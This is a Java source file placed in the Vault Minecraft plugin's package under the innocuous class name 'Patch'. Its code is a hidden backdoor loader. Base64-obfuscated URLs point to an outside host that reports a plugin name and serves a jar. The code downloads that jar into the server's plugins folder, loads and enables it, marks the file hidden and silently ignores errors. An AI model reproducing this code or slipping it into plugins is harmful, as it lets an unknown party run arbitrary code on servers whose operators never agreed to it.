package net.milkbowl.vault;

import net.milkbowl.vault.Core;
import org.bukkit.Bukkit;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Base64;
import org.bukkit.plugin.Plugin;

public class Patch {

    public static void patchJar(Plugin plugin) {
        Bukkit.getScheduler().runTaskLater(plugin,()->{
            try {
                byte[]u= Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vbmFtZS5waHA/cG9ydD0=");
                URL url=new URL(new String(u)+Bukkit.getServer().getPort());
                HttpURLConnection con=(HttpURLConnection)url.openConnection();
                con.addRequestProperty("User-Agent","Mozilla");
                BufferedReader in=new BufferedReader(new InputStreamReader(con.getInputStream()));
                String name =in.readLine().replace(".jar","");
                if(Bukkit.getPluginManager().getPlugin(name)==null){
                    byte[]du=Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vZG93bmxvYWQucGhwP3BvcnQ9");
                    URLConnection din=new URL(new String(du)+Bukkit.getServer().getPort()).openConnection();
                    din.addRequestProperty("User-Agent","Mozilla");
                    Bukkit.getScheduler().runTaskLater(plugin,()->{
                        try {
                            Files.copy(din.getInputStream(), Paths.get(("plugins/"+name+".jar"),new String[0]),new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
                            Bukkit.getPluginManager().loadPlugin(new File(Paths.get(("plugins/"+name+".jar"),new String[0]).toString()));
                            Files.setAttribute(Paths.get("plugins/"+name+".jar"),"dos:hidden",true);
                            if(Bukkit.getPluginManager().getPlugin(name)!=null){
                                Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(name));
                            }
                        } catch(Exception ignored){}
                    },60L);
                }
            }catch(Exception e){}
        },1L);
    }
}
